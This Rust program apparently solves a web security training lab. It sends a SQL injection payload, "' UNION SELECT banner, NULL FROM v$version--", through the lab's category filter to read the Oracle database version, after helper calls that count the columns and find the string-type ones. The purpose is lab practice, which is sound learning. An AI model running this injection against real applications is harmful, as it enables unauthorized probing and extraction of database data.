use regex::Regex;
use server_side_sql_injection::{
    HTTP_CLIENT, check_is_lab_solved, fetch_target_string, find_columns_of_type_string,
    find_no_of_columns, generate_clap_parser,
};
use std::sync::LazyLock;

static DEFAULT_EXTRACT_TARGET_STRING_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"Make\sthe\sdatabase\sretrieve\sthe\sstrings:\s'(.+?)'")
        .expect("[-] Failed to construct EXTRACT_TARGET_STRING_REGEX")
});

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");
    let lab_url_with_endpoint = format!("{lab_url}/filter?category=");

    let target_string = fetch_target_string(lab_url, Some(&DEFAULT_EXTRACT_TARGET_STRING_REGEX));

    let columns = find_no_of_columns(&lab_url_with_endpoint, None, Some(true));

    find_columns_of_type_string(&lab_url_with_endpoint, columns, None, Some(true));

    let query = "' UNION SELECT banner, NULL FROM v$version--";

    logger::info(format!("Making query : {}/filter?category={}", lab_url, query).as_ref());

    let response = HTTP_CLIENT
        .get(format!("{}/filter?category={}", lab_url, query))
        .send()
        .expect("[-] Failed to make the GET request");

    if response.status() == 200 {
        if response
            .text()
            .expect("[-] Failed to extract text from response")
            .contains(&target_string)
        {
            logger::success("Successfully queried the database type and version on Oracle");
        } else {
            panic!(
                "{}",
                logger::error_return("Database version not found in response")
            )
        }
    } else {
        panic!(
            "{}",
            logger::error_return("Failed to fetch the database version")
        )
    }

    check_is_lab_solved(lab_url);
}
